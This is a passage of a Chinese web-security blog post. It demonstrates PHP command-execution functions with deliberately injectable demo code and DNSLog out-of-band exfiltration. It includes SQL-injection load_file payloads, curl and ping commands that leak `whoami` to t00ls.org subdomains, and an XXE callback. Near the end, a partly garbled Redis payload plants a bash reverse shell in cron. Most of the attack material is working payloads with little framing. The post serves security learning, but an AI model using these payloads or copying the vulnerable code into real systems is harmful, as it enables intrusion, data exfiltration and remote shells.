+<p>结果：<br><a href="http://127.0.0.1/ip.php?cmd=type" target="_blank" rel="external">http://127.0.0.1/ip.php?cmd=type</a> ip.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    $target=$_GET[&apos;cmd&apos;];</div><div class="line">    $return = system($target);</div><div class="line">	echo &quot;&lt;pre&gt;system return value is: $return &lt;/pre&gt;&quot;;</div><div class="line">?&gt;&lt;pre&gt;system return value is: ?&gt; &lt;/pre&gt;</div></pre></td></tr></table></figure></p>
+<p>exec</p>
+<p>说明<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">string exec ( string $command [, array $output [, int $return_var ]] )</div><div class="line"></div><div class="line">command 要执行的命令。</div><div class="line"></div><div class="line">output 会使用返回结果填充output；如果output参数中已经有元素，exec()会在output后面追加。</div><div class="line"></div><div class="line">return_var 如果同时提供 output 和 return_var 参数，命令执行后的返回状态会被写入到此变量。</div><div class="line">命令执行成功，返回0，失败返回1.</div><div class="line"></div><div class="line">返回值：</div><div class="line">成功则返回命令输出的最后一行</div></pre></td></tr></table></figure></p>
+<p>测试代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	exec(&apos;whoami&apos;,$arr);</div><div class="line">	var_dump($arr);</div><div class="line">	echo &quot;&lt;br /&gt;&quot;;</div><div class="line">	echo exec(&apos;netstat -ano | findstr 3306&apos;,$arr); // 返回命令输出的最后一行。</div><div class="line">	echo &quot;&lt;br /&gt;&quot;;</div><div class="line">	var_dump($arr);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
+<p>结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">array(1) &#123;</div><div class="line">  [0]=&gt;</div><div class="line">  string(29) &quot;lxhsec1-2688b1f\administrator&quot;</div><div class="line">&#125;</div><div class="line">&lt;br /&gt;  TCP    127.0.0.1:3306         127.0.0.1:2143         ESTABLISHED     1020&lt;br /&gt;array(4) &#123;</div><div class="line">  [0]=&gt;</div><div class="line">  string(29) &quot;lxhsec1-2688b1f\administrator&quot;</div><div class="line">  [1]=&gt;</div><div class="line">  string(75) &quot;  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       1020&quot;</div><div class="line">  [2]=&gt;</div><div class="line">  string(75) &quot;  TCP    127.0.0.1:2143         127.0.0.1:3306         ESTABLISHED     3852&quot;</div><div class="line">  [3]=&gt;</div><div class="line">  string(75) &quot;  TCP    127.0.0.1:3306         127.0.0.1:2143         ESTABLISHED     1020&quot;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>shell_exec</p>
+<p>说明<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">string shell_exec ( string $cmd )</div><div class="line"></div><div class="line">cmd 要执行的命令。</div><div class="line"></div><div class="line">返回值</div><div class="line">命令执行的输出。 如果执行过程中发生错误或者进程不产生输出，则返回 NULL。</div><div class="line"></div><div class="line">Note: PHP 支持一个执行运算符：反引号（``）,</div><div class="line">PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回.</div><div class="line">使用反引号运算符&quot;`&quot;的效果与函数 shell_exec() 相同</div></pre></td></tr></table></figure></p>
+<p>测试代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	echo shell_exec(&quot;whoami&quot;);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
+<p>结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lxhsec1-2688b1f\administrator</div></pre></td></tr></table></figure></p>
+<p>passthru</p>
+<p>说明<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">void passthru ( string $command [, int $return_var ] )</div><div class="line"></div><div class="line">command 要执行的命令。</div><div class="line"></div><div class="line">return_var 命令执行成功，返回0，失败返回1.（可选参数）</div><div class="line"></div><div class="line">没有返回值。</div></pre></td></tr></table></figure></p>
+<p>测试代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	passthru(&quot;whoami&quot;,$return);</div><div class="line">	echo $return;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
+<p>结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">lxhsec1-2688b1f\administrator</div><div class="line">0</div></pre></td></tr></table></figure></p>
+<p>popen</p>
+<p>说明<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">resource popen ( string $command , string $mode )</div><div class="line"></div><div class="line">command 要执行的命令。</div><div class="line">mode 模式，</div><div class="line">r: 只读，返回的文件指针等于命令的STDOUT(命令的输出)</div><div class="line">w: 只写（打开并清空已有文件或创建一个新文件），返回的文件指针等于命令的STDIN</div><div class="line"></div><div class="line">返回值</div><div class="line">返回一个和 fopen() 所返回的相同的文件指针，只不过它是单向</div><div class="line">的（只能用于读或写）并且必须用 pclose() 来关闭。</div><div class="line">此指针可以用于 fgets()，fgetss() 和 fwrite()。</div><div class="line"></div><div class="line">如果出错返回 FALSE。</div></pre></td></tr></table></figure></p>
+<p>测试代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">	$target = $_GET[ &apos;cmd&apos; ];</div><div class="line">	popen( &apos;ping  &apos; . $target, &quot;r&quot; );</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
+<p>测试结果:<br><a href="http://127.0.0.1/ip.php?cmd=127.0.0.1" target="_blank" rel="external">http://127.0.0.1/ip.php?cmd=127.0.0.1</a> %26 whoami &gt; 222.txt<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">会在ip.php同目录下生成一个222.txt文件，里面记录了whoami的内容</div></pre></td></tr></table></figure></p>
+<p>如果想将结果输出到页面上，可以使用下面测试代码</p>
+<p>测试代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">$cmd = &quot;whoami&quot;;  </div><div class="line">$fp = popen($cmd,&quot;r&quot;);  //popen打一个进程通道  </div><div class="line">  </div><div class="line">while (!feof($fp)) &#123;      //从通道里面取得东西  </div><div class="line">	$out = fgets($fp, 1024);  </div><div class="line">	echo  $out;         //打印出来  </div><div class="line">&#125;  </div><div class="line">pclose($fp);  </div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
+<p>结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lxhsec1-2688b1f\administrator</div></pre></td></tr></table></figure></p>
+<p>proc_popen</p>
+<p>说明<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">resource proc_open ( string $cmd , array </div><div class="line">$descriptorspec , array $pipes [, string $cwd [,</div><div class="line">array $env [, array $other_options ]]] )</div><div class="line"></div><div class="line">cmd 要执行的命令。</div><div class="line"></div><div class="line">descriptorspec  一个索引数组。 </div><div class="line">数组的键表示描述符，数组元素值表示 PHP 如何将这些描述符传送至子进程。 </div><div class="line">0 表示标准输入（stdin），</div><div class="line">1 表示标准输出（stdout），</div><div class="line">2 表示标准错误（stderr）。</div><div class="line"></div><div class="line">数组值中第一个参数为描述符类型，有效的类型有：pipe 以及file。</div><div class="line"></div><div class="line">pipes</div><div class="line">将被置为索引数组， 其中的元素是被执行程序创建的管道对应到 PHP 这一端的文件指针。</div><div class="line"></div><div class="line">cwd </div><div class="line">要执行命令的初始工作目录。 必须是绝对路径，为 NULL 时，代表当前 PHP 进程的工作目录。</div><div class="line"></div><div class="line">env</div><div class="line">要执行的命令所使用的环境变量，为 NULL 时，代表与php进程环境变量相同</div><div class="line"></div><div class="line">other_options</div><div class="line">可能的选项包括：</div><div class="line">suppress_errors （仅用于 Windows 平台）： 设置为 TRUE 表示抑制本函数产生的错误。</div><div class="line">bypass_shell （仅用于 Windows 平台）： 设置为 TRUE 表示绕过 cmd.exe shell。</div><div class="line"></div><div class="line">返回值</div><div class="line">返回表示进程的资源类型，并且必须用 proc_close() 来关闭，如果失败，返回 FALSE。</div></pre></td></tr></table></figure></p>
+<p>测试代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">	$target = $_GET[ &apos;cmd&apos; ];</div><div class="line">	$descriptorspec = array(</div><div class="line">		0 =&gt; array(&quot;pipe&quot;, &quot;r&quot;),  // 标准输入，子进程从此管道中读取数据</div><div class="line">	);</div><div class="line">	proc_open(  &apos;ping  &apos; . $target, $descriptorspec,$pipes);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
+<p>测试结果:<br><a href="http://127.0.0.1/ip.php?cmd=127.0.0.1" target="_blank" rel="external">http://127.0.0.1/ip.php?cmd=127.0.0.1</a> %26 whoami &gt; 122222.txt<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">在上述测试代码中，因为明确指明它的工作目录，因此会在php默认的工作目录中产生122222.txt，</div><div class="line">由于环境是phpStudy搭建的，因此默认工作目录是C:\Program Files\phpStudy。</div></pre></td></tr></table></figure></p>
+<p>如果想将结果输出到页面上，可以使用下面测试代码</p>
+<p>测试代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">$cmd = &quot;whoami&quot;;  </div><div class="line">$descriptorspec = array(</div><div class="line">   0 =&gt; array(&quot;pipe&quot;, &quot;r&quot;),  // 标准输入，子进程从此管道中读取数据</div><div class="line">   1 =&gt; array(&quot;pipe&quot;, &quot;w&quot;),  // 标准输出，子进程向此管道中写入数据</div><div class="line">   2 =&gt; array(&quot;file&quot;, &quot;./error-output.txt&quot;, &quot;a&quot;) // 标准错误，写入到一个文件</div><div class="line">);</div><div class="line"> </div><div class="line">$fp = proc_open($cmd,$descriptorspec,$pipes);   //打开一个进程通道  </div><div class="line"></div><div class="line">echo stream_get_contents($pipes[1]); </div><div class="line">proc_close($fp);  </div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
+<p>结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lxhsec1-2688b1f\administrator</div></pre></td></tr></table></figure></p>
+<p>总结</p>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>system</td>
+<td>输出并返回最后一行shell结果</td>
+</tr>
+<tr>
+<td>exec</td>
+<td>不输出结果，返回最后一行shell结果，所有结果保存到一个返回的数组里面</td>
+</tr>
+<tr>
+<td>shell_exec</td>
+<td>将命令结果直接输出</td>
+</tr>
+<tr>
+<td>passthru</td>
+<td>将命令结果直接输出</td>
+</tr>
+<tr>
+<td>popen，proc_open</td>
+<td>不会直接返回执行结果，而是返回一个文件指针，返回什么不是关键，重要的是命令已经执行了</td>
+</tr>
+</tbody>
+</table>
+<h2 id="DNSLog"><a href="#DNSLog" class="headerlink" title="DNSLog"></a>DNSLog</h2><h3 id="0x01-作用"><a href="#0x01-作用" class="headerlink" title="0x01 作用"></a>0x01 作用</h3><p>某些漏洞直接利用无法得到回显的情况下，但是目标可以发起DNS请求，这时候可以通过DNSlog将想要获取的数据外带出来。</p>
+<h3 id="0x02-原理"><a href="#0x02-原理" class="headerlink" title="0x02 原理"></a>0x02 原理</h3><p>DNS解析的基本原理：<br><img src="/2018/11/13/Web/dns.jpeg" alt="DNS"></p>
+<p>以mysql为例，讲解DNSlog基本原理。</p>
+<p>在mysql中 load_file可用于发起DNS请求。</p>
+<p>测试payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select load_file(concat(&apos;\\\\&apos;,(select user()),&apos;.t00ls.org\\abc&apos;));</div></pre></td></tr></table></figure></p>
+<p>结果如下：</p>
+<p><img src="/2018/11/13/Web/mysqldnslog.png" alt="mysqldnslog"></p>
+<p>Dnslog攻击的基本原理如下</p>
+<p><img src="/2018/11/13/Web/mysqldnslog1.jpg" alt="mysqldnslog"></p>
+<p>总结来说，当你查询root@localhost.t00ls.org这个子域名时，dns服务器t00ls.org会收到你的解析请求，随后将你外带的值解析出来。</p>
+<p>但是由于域名有一定的规范，一些特殊符号’@’,’*’等不能作为域名，因此外带的数据最好进行加密处理，否则将导致数据传输失败，如下：</p>
+<p>测试payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select load_file(concat(&apos;\\\\&apos;,(select hex(user())),&apos;.t00ls.org\\abc&apos;));</div></pre></td></tr></table></figure></p>
+<p>结果如下：<br><img src="/2018/11/13/Web/mysqldnslog2.png" alt="mysqldnslog2"></p>
+<p>另外，payload中带上<code>\\abc</code>，是因为要满足UNC语法。用2个<code>\\</code>是因为转义，本质是:<code>\</code><br>UNC路径规定语法：<code>\\servername\sharename</code><br>其中servername是服务器名。<br>sharename是共享资源的名称，也就是abc，<br>你要访问共享资源就必须跟资源名称。<br>满足语法要求后系统才会发起DNS请求，抓包就可以看见。</p>
+<p>Note:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">因为Linux没有UNC路径这个东西，所以当MySQL处于Linux系</div><div class="line">统中的时候，是不能使用这种方式外带数据的</div></pre></td></tr></table></figure></p>
+<p>注意，域名前缀长度限制在63个，如果获取的数据超长，可用mid等截取函数进行分段读取，例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mid(user(),1,4) 截取 user 1,4范围</div><div class="line"></div><div class="line">http://127.0.0.1/sqli.php?id=1&apos; union select 1,load_file(concat(&apos;\\\\&apos;,(select hex(mid(user(),1,4))),&apos;.t00ls.8c461ff41380308eba69317397ff7cdd.tu4.org\\abc&apos;)),3%23</div><div class="line"></div><div class="line">mid(user(),5) 截取 4后面的所有</div><div class="line"></div><div class="line">http://127.0.0.1/sqli.php?id=1&apos; union select 1,load_file(concat(&apos;\\\\&apos;,(select hex(mid(user(),5))),&apos;.t00ls.8c461ff41380308eba69317397ff7cdd.tu4.org\\abc&apos;)),3%23</div></pre></td></tr></table></figure></p>
+<p><img src="/2018/11/13/Web/mysqldnslog3.png" alt="mysqldnslog3"></p>
+<h3 id="0x03利用"><a href="#0x03利用" class="headerlink" title="0x03利用"></a>0x03利用</h3><h4 id="DNSLog-In-Mysql-Injection"><a href="#DNSLog-In-Mysql-Injection" class="headerlink" title="DNSLog In Mysql Injection"></a>DNSLog In Mysql Injection</h4><p>首先查看变量确定权限。<br>show variables like ‘%secure%’</p>
+<p>1、当secure_file_priv为空，可以读取写入文件任意目录。<br>2、当secure_file_priv为E:\，可以读取写入E盘。<br>3、当secure_file_priv为null，不允许读取写入文件。<br>在mysql 5.5.53版本之前默认为空可以加载文件 但是之后版本默认为NULL，会限制函数OUTFILE，LOAD_FILE，DUMP_FIlE等。</p>
+<p>解决问题:<br>windows下：修改my.ini 在[mysqld]内加入secure_file_priv =</p>
+<p>linux下：修改my.cnf 在[mysqld]内加入secure_file_priv =</p>
+<p>然后重启mysql。</p>
+<p>union<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/sqli.php?id=1&apos; union select 1,load_file(concat(&apos;\\\\&apos;,(select hex(user())),&apos;.t00ls.org\\abc&apos;)),3%23</div></pre></td></tr></table></figure></p>
+<p>blind<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/sqli_blind.php?id=1&apos; and if((select load_file(concat(&apos;\\\\&apos;,(select hex(version())),&apos;.t00ls.org\\abc&apos;))),sleep(5),0)%23</div></pre></td></tr></table></figure></p>
+<h4 id="DNSLog-In-OS-Commanding"><a href="#DNSLog-In-OS-Commanding" class="headerlink" title="DNSLog In OS Commanding"></a>DNSLog In OS Commanding</h4><p>Windows:<br><code>ping  %USERNAME%.t00ls.org</code><br>结果:<br><img src="/2018/11/13/Web/dnslogos0.png" alt="dnslogos0"></p>
+<p>Linux:</p>
+<p>curl：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl http://`whoami`.t00ls.org/</div></pre></td></tr></table></figure></p>
+<p>结果：<br><img src="/2018/11/13/Web/dnslogos1.png" alt="dnslogos1"></p>
+<p>ping:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ping `whoami`.t00ls.org</div></pre></td></tr></table></figure></p>
+<p>结果：<br><img src="/2018/11/13/Web/dnslogos2.png" alt="dnslogos2"></p>
+<h4 id="DNSLog-In-XXE"><a href="#DNSLog-In-XXE" class="headerlink" title="DNSLog In XXE"></a>DNSLog In XXE</h4><p>测试代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$xml = <span class="string">&lt;&lt;&lt;EOF</span></div><div class="line"><span class="string">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></div><div class="line"><span class="string">&lt;!DOCTYPE ANY [</span></div><div class="line"><span class="string">  &lt;!ENTITY % lxhsec SYSTEM "http://666.t00ls.xxxxxxx.tu4.org"&gt;</span></div><div class="line"><span class="string">%lxhsec;</span></div><div class="line"><span class="string">]&gt;</span></div><div class="line"><span class="string">&lt;lxhsec&gt;root&lt;/lxhsec&gt;</span></div><div class="line"><span class="string">EOF;</span></div><div class="line">$data = simplexml_load_string($xml);</div><div class="line">print_r($data);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>测试结果：<br><img src="/2018/11/13/Web/dnslogxxe.png" alt="dnslogxxe"></p>
+<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>1.受操作系统限制，例如UNC在linux下没有。<br>2.受域名长度限制，必要的时候需要对查询结果做字符串切割。<br>3.受特殊符号限制，需要进行编码传输。<br>4.受语法限制，不同数据库之间拼接方式不同。</p>
+<p>–每一行都要使用分隔符(CRLF)<br>–一条命令用”<em>”开始，同时用数字作为参数，需要分隔符(“</em>1”+ CRLF)<br>–我们有多个参数时：<br>-字符：以”$”开头+字符的长度（＂$4＂+CRLF）+字符串(“TIME”+CRLF) 即＂$4＂+CRLF + “TIME”+CRLF<br>-整数：以”:”开头+整数的ASCII码(“:42”+CRLF)</p>
+<p>_<em>3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a%0a</em>/1 <em> </em> <em> </em> bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1%0a%0a%0a%0d%0a<em>4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a</em>4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a<em>1%0d%0a$4%0d%0asave%0d%0a</em>1%0d%0a$4%0d%0aquit%0d%0a’</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    lyxhh
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://www.lxhsec.com/2018/11/13/Web/" title="Web Security">http://www.lxhsec.com/2018/11/13/Web/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/09/24/Hexo/" rel="next" title="Hexo">
+                <i class="fa fa-chevron-left"></i> Hexo
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/02/24/exploit/" rel="prev" title="exploits">
+                exploits <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8zMjIyNy84Nzkx"></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/1.jpg"
+                alt="lyxhh" />
+            
+              <p class="site-author-name" itemprop="name">lyxhh</p>
+              <p class="site-description motion-element" itemprop="description">有你给的阳光，没有理由绝望。</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+          </div>
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.secbug.org/" title="破晓团队" target="_blank">破晓团队</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL-Injection"><span class="nav-number">1.</span> <span class="nav-text">SQL Injection</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#UNION-query-based"><span class="nav-number">1.1.</span> <span class="nav-text">UNION query-based</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Time-based-blind"><span class="nav-number">1.2.</span> <span class="nav-text">Time-based blind</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF（Server-Side-Request-Forgery）"><span class="nav-number">2.</span> <span class="nav-text">SSRF（Server Side Request Forgery）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#文件包含（File-include）"><span class="nav-number">3.</span> <span class="nav-text">文件包含（File include）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#本地文件包含漏洞"><span class="nav-number">3.1.</span> <span class="nav-text">本地文件包含漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#远程文件包含漏洞"><span class="nav-number">3.2.</span> <span class="nav-text">远程文件包含漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP伪协议"><span class="nav-number">3.3.</span> <span class="nav-text">PHP伪协议</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#file-—-访问本地文件系统"><span class="nav-number">3.3.1.</span> <span class="nav-text">file:// — 访问本地文件系统</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#http-s-—-访问-HTTP-s-网址（相当于远程文件包含）"><span class="nav-number">3.3.2.</span> <span class="nav-text">http(s):// — 访问 HTTP(s) 网址（相当于远程文件包含）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#php-访问各个输入-输出流（I-O-streams）"><span class="nav-number">3.3.3.</span> <span class="nav-text">php:// - 访问各个输入/输出流（I/O streams）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#data-伪协议"><span class="nav-number">3.3.4.</span> <span class="nav-text">data://伪协议</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#phar-伪协议"><span class="nav-number">3.3.5.</span> <span class="nav-text">phar://伪协议</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#zip-伪协议"><span class="nav-number">3.3.6.</span> <span class="nav-text">zip://伪协议</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#总结"><span class="nav-number">3.3.7.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#修复建议"><span class="nav-number">3.4.</span> <span class="nav-text">修复建议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XML外部实体攻击（XML-External-Entity-attack）"><span class="nav-number">4.</span> <span class="nav-text">XML外部实体攻击（XML External Entity attack）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#命令执行（OS-Commanding）"><span class="nav-number">5.</span> <span class="nav-text">命令执行（OS Commanding）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DNSLog"><span class="nav-number">6.</span> <span class="nav-text">DNSLog</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a 